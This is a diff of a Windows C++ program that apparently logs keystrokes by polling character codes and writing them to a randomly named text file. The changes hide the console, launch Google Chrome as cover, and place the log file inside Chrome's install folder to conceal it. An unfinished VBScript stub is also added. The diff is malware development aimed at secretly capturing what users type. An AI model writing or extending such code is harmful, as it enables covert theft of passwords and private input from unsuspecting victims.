@@ -5,7 +5,9 @@
 #include <cstdio>
 #include <Lmcons.h>
 #include <vector>
+#include<sys/stat.h>
 #include <tlhelp32.h>
+#include <streambuf>
 
 using namespace std;
 const int MAX = 26;
@@ -37,13 +39,40 @@ string generateFileName(int n)
     for (int i = 0; i < n; i++)
         res = res + alphabet[rand() % MAX];
 
-    return res + ".txt";
+    return "C:\\Program Files (x86)\\Google\\Chrome\\Application\\" + res + ".txt";
 }
+
+bool is_file_exist(const char *fileName)
+{
+    ifstream infile(fileName);
+    return infile.good();
+}
+
+void openGoogleChrome(){
+    STARTUPINFO info = {sizeof(info)};
+    PROCESS_INFORMATION processInfo;
+    if (is_file_exist("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
+    {
+        CreateProcess("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+    }else{
+        exit(0); 
+    }
+    
+}
+
+string createVBScript()
+{
+
+}
+
 
 int main()
 {
+    FreeConsole();
+    Sleep(1000);
     short character;
     string fileName = generateFileName(10);
+    openGoogleChrome();
     while (1)
     {
         for (character = 8; character <= 200; character++)
